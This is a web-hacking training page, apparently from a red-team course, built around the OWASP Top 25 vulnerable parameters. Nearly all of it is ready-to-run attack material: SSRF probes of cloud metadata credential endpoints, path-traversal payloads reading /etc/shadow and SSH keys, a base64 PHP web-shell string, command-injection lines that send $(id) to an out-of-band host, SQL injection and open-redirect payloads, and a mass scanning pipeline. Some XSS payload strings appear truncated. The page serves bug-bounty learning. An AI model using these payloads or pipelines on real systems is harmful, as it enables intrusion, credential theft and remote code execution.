---
layout: training-page
title: "OWASP Top 25 Parameters — Red Team Academy"
module: "Web Hacking"
tags:
  - parameters
  - recon
  - bug-bounty
  - gf
  - xss
  - ssrf
  - lfi
  - sqli
  - rce
  - open-redirect
page_key: "web-top-25-parameters"
render_with_liquid: false
---

# OWASP Top 25 Vulnerable Parameters

The OWASP Top 25 Parameters project identifies the most commonly vulnerable URL parameters for XSS, SSRF, LFI, SQLi, RCE, and Open Redirect vulnerabilities. These lists are used with `gf` (grep for patterns) and automation tools to quickly surface injectable parameters during recon. Compiled by the TR Bug Hunters Community and the OWASP project.

## Setup: gf Tool

```
# Install gf (tomnomnom's grep filter)
go install github.com/tomnomnom/gf@latest

# Install these patterns into ~/.gf/
git clone https://github.com/OWASP/www-project-top-25-parameters
cp www-project-top-25-parameters/gf-patterns/*.json ~/.gf/

# Use with waybackurls / gau to grep collected URLs:
cat urls.txt | gf xss
cat urls.txt | gf ssrf
cat urls.txt | gf lfi
cat urls.txt | gf sqli
cat urls.txt | gf rce
cat urls.txt | gf openredirect

# Pipeline: collect URLs → filter for injectable params → fuzz
gau target.com | gf xss | tee xss-candidates.txt
katana -u https://target.com -silent | gf ssrf | tee ssrf-candidates.txt
```

## Top 25 XSS Parameters

```
# High-frequency parameters that commonly reflect user input without sanitization
# Test each with: "> and event handler variants

q=          # search query — reflected in results page
s=          # search (alternative)
search=     # search input
id=         # content ID — reflected in headings/metadata
lang=       # language code — often reflects value in HTML attribute
keyword=    # keyword search
query=      # query string
page=       # page name/title — may render in breadcrumbs
keywords=   # keyword list
year=       # year filter — reflected in page content
view=       # view type — controls display mode
email=      # email input — reflected in confirmation messages
type=       # content type — may reflect in class attributes
name=       # username/display name
p=          # page/product
month=      # month filter
image=      # image filename/URL — may reflect in alt attribute
list_type=  # list display type
url=        # URL parameter — often reflected in redirect or link
terms=      # search terms
categoryid= # category name
key=        # API key/identifier
l=          # language (short form)
begindate=  # date range — reflected in filters
enddate=    # date range — reflected in filters
```

## XSS Testing with These Parameters

```
# Quick payload scatter across all XSS params
# Use ffuf or qsreplace for bulk testing:

# qsreplace: replaces all query string values with a payload
cat xss-candidates.txt | qsreplace '">'

# ffuf: fuzz one parameter at a time
ffuf -u "https://target.com/search?q=FUZZ" \
     -w payloads/xss-short.txt \
     -mr "alert(1)" \
     -H "User-Agent: Mozilla/5.0"

# Dalfox: automated XSS scanner using parameter-aware fuzzing
cat xss-candidates.txt | dalfox pipe --silence
dalfox url "https://target.com/search?q=test" --skip-bav
```

## Top 25 SSRF Parameters

```
# Parameters that commonly accept URLs or host values
# Test with internal IP addresses, cloud metadata endpoints, Burp Collaborator

dest=        # destination URL
redirect=    # redirect target
uri=         # uniform resource identifier
path=        # resource path
continue=    # post-action redirect
url=         # URL to fetch/preview
window=      # target window URL
next=        # next page URL
data=        # external data source
reference=   # external reference
site=        # site URL
html=        # HTML content URL
val=         # value/URL
validate=    # validation URL
domain=      # domain to connect to
callback=    # callback URL
return=      # return URL
page=        # page URL
feed=        # RSS/Atom feed URL
host=        # host to connect to
port=        # port for connection
to=          # destination
out=         # output destination
view=        # view source URL
dir=         # directory/URL
```

## SSRF Testing with These Parameters

```
# Use interactsh for out-of-band SSRF detection:
# Start listener: interactsh-client
# Replace parameter value with your interactsh URL

cat ssrf-candidates.txt | qsreplace "http://YOUR_INTERACTSH_ID.oast.pro"

# Cloud metadata endpoints to test directly:
http://169.254.169.254/latest/meta-data/          # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/  # GCP (requires header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
http://100.100.100.200/latest/meta-data/          # Alibaba Cloud

# Internal port scanning via SSRF:
for port in 22 80 443 3306 5432 6379 8080 8443; do
  curl -s "https://target.com/fetch?url=http://127.0.0.1:$port" &
done

# ffuf for SSRF parameter fuzzing:
ffuf -u "https://target.com/redirect?url=FUZZ" \
     -w ssrf-payloads.txt \
     -mr "root:|aws|metadata" \
     -timeout 5
```

## Top 25 LFI Parameters

```
# Parameters that commonly read local files
# Test with: ../../../etc/passwd and encoded variants

cat=       # category/file to display
dir=       # directory listing
action=    # action file
board=     # board/template file
date=      # date-based file include
detail=    # detail view file
file=      # file to read (highest priority)
download=  # file to download
path=      # file path
folder=    # folder to list
prefix=    # path prefix
include=   # file to include (PHP include)
page=      # page template
inc=       # include file
locate=    # locale/file
show=      # file to show
doc=       # document path
site=      # site/subdomain file
type=      # file type/extension
view=      # view template
content=   # content file
document=  # document path
layout=    # layout template file
mod=       # module file
conf=      # configuration file
```

## LFI Testing with These Parameters

```
# LFI payload variants for path traversal:
../../../etc/passwd
....//....//....//etc/passwd        # double-encoded traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
/etc/passwd%00                      # null byte (PHP < 5.3)
php://filter/convert.base64-encode/resource=index.php  # PHP wrapper
php://input                         # POST body execution
expect://id                         # command execution (if expect enabled)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Target files by OS:
# Linux:
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log   # log poisoning for RCE
/var/log/nginx/access.log
/proc/self/cmdline
/.ssh/id_rsa
/home/USER/.bash_history

# Windows:
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\win.ini
C:\boot.ini

# ffuf with LFI wordlist:
ffuf -u "https://target.com/page?file=FUZZ" \
     -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mr "root:x:" \
     -fc 200  # adjust as needed
```

## Top 25 SQLi Parameters

```
# Parameters commonly used in database queries
# Test with: ' " ; -- # 1 OR 1=1 and time-based payloads

id=        # record ID — direct database lookup
page=      # page number/name
report=    # report ID
dir=       # sort direction
search=    # search query
category=  # category filter
file=      # file reference stored in DB
class=     # class/type filter
url=       # stored URL
news=      # news article ID
item=      # item ID
menu=      # menu item ID
lang=      # language code stored in DB
name=      # name lookup
ref=       # reference code
title=     # title search
view=      # view name
topic=     # topic ID
thread=    # thread ID
type=      # content type
date=      # date filter
form=      # form ID
main=      # main section
nav=       # nav section
region=    # region filter
```

## SQLi Testing with These Parameters

```
# Quick detection payloads:
'                          # syntax error
1 OR 1=1                   # always-true condition
1 AND 1=2                  # always-false
1' AND '1'='1              # string context
1"; --                     # comment-based bypass

# Time-based blind (confirm execution without output):
1; WAITFOR DELAY '0:0:5'-- (MSSQL)
1 AND SLEEP(5)--            (MySQL)
1; SELECT pg_sleep(5)--    (PostgreSQL)

# sqlmap automation with parameter list:
sqlmap -u "https://target.com/page?id=1" \
       --batch \
       --dbs \
       --random-agent \
       --level=3 \
       --risk=2

# sqlmap with piped URLs from gf:
cat sqli-candidates.txt | sqlmap --batch --dbs -m /dev/stdin
```

## Top 25 RCE Parameters (GET-based)

```
# Parameters that may pass input to system commands or eval functions

cmd=       # command to execute
exec=      # command execution
command=   # shell command
execute=   # execute directive
ping=      # ping command (network tools)
query=     # query/command
jump=      # jump/exec directive
code=      # code to evaluate
reg=       # registry/exec operation
do=        # action/command
func=      # function to call
arg=       # argument to function
option=    # option/flag
load=      # module to load (eval/include)
process=   # process name/command
step=      # step/stage in pipeline
read=      # read/exec operation
feature=   # feature toggle (eval)
exe=       # executable name
module=    # module to load/execute
payload=   # payload to process
run=       # run command
print=     # print/eval (Python/PHP)
```

## RCE Testing with These Parameters

```
# Basic OS command injection probes:
; id
| id
&& id
` id `
$(id)
;id;
%0aid          # URL-encoded newline

# OOB detection (use when no output visible):
; curl http://YOUR_INTERACTSH_ID.oast.pro/$(id)
| nslookup $(whoami).YOUR_INTERACTSH_ID.oast.pro
&& ping -c 1 YOUR_INTERACTSH_ID.oast.pro

# Time-based detection (no OOB, no output):
; sleep 5
| timeout 5
&& ping -c 5 127.0.0.1

# Windows:
; dir
| whoami
& net user
%26 whoami

# Code injection (eval context):
${7*7}              # Jinja2/Twig SSTI probe
{{7*7}}             # SSTI
<?php system($_GET['c']); ?>   # PHP injection
```

## Top 25 Open Redirect Parameters (GET-based)

```
# Parameters that control redirect targets
# Test with: https://evil.com and obfuscated variants

next=          # next page after action
url=           # redirect URL
target=        # target URL
rurl=          # return URL
dest=          # destination
destination=   # redirect destination
redir=         # redirect URL
redirect_uri   # OAuth redirect URI
redirect_url=  # redirect URL
redirect=      # redirect target
out=           # output/redirect
view=          # view redirect
to=            # to URL
image_url=     # image URL (may redirect on failure)
go=            # go/redirect
return=        # return URL
returnTo=      # return destination
return_to=     # return destination
checkout_url=  # post-checkout redirect
continue=      # continue URL
return_path=   # return path
```

## Open Redirect Testing

```
# Basic payloads:
https://evil.com
//evil.com
///evil.com
////evil.com
https:evil.com
https;//evil.com        # semicolon bypass
https://target.com@evil.com
https://evil.com%23target.com   # fragment bypass
https://evil.com%3Ftarget.com   # query bypass

# Allowlist bypass techniques:
https://target.com.evil.com     # subdomain of target
https://evil.com/target.com     # path confusion
https://evil%E3%80%82com        # Unicode dot

# Validate with: does the browser end up at evil.com?
# Check Location: header in response:
curl -s -I "https://target.com/redirect?url=https://evil.com" | grep -i location

# Open redirect → XSS chain (javascript: scheme):
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# Automation with openredirect tool:
openredirex -l redirect-candidates.txt -p "https://evil.com"
```

## Full Recon Pipeline

```
# End-to-end pipeline: collect URLs → filter by vuln type → fuzz

# Step 1: Collect URLs
gau target.com --threads 5 | tee urls-raw.txt
waybackurls target.com | tee -a urls-raw.txt
katana -u https://target.com -jc -silent | tee -a urls-raw.txt
sort -u urls-raw.txt -o urls.txt

# Step 2: Filter by vulnerability parameter type
cat urls.txt | gf xss > xss-params.txt
cat urls.txt | gf ssrf > ssrf-params.txt
cat urls.txt | gf lfi > lfi-params.txt
cat urls.txt | gf sqli > sqli-params.txt
cat urls.txt | gf rce > rce-params.txt
cat urls.txt | gf openredirect > redirect-params.txt

# Step 3: Fuzz each category
cat xss-params.txt | qsreplace '">' | \
  httpx -silent -mr 'onerror=alert' -o xss-hits.txt

cat ssrf-params.txt | qsreplace "http://169.254.169.254/" | \
  httpx -silent -mr "ami-id|instance-id" -o ssrf-hits.txt

cat lfi-params.txt | qsreplace "../../../etc/passwd" | \
  httpx -silent -mr "root:x:" -o lfi-hits.txt

# Step 4: Validate findings manually in Burp Suite
```

## Resources

- OWASP Top 25 Parameters — `github.com/OWASP/www-project-top-25-parameters`
- gf (grep filter) — `github.com/tomnomnom/gf`
- qsreplace — `github.com/tomnomnom/qsreplace`
- Dalfox XSS scanner — `github.com/hahwul/dalfox`
- sqlmap — `github.com/sqlmapproject/sqlmap`
- interactsh — `github.com/projectdiscovery/interactsh`
- katana crawler — `github.com/projectdiscovery/katana`
- gau (Get All URLs) — `github.com/lc/gau`
